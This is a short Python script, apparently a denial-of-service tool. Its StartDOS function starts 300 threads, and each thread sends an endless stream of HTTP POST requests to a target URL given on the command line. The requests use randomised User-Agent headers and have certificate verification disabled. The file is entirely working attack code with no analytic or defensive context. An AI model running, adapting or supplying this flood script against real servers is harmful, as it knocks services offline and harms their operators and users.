import threading, requests, user_agent, re, sys
def StartDOS():
	while True:
		requests.post(sys.argv[1], headers={"User-Agent":user_agent.generate_user_agent(),"Accept-Language":"ru"}, verify=False)
for index in range(300):
	x=threading.Thread(target=StartDOS)
	x.start()
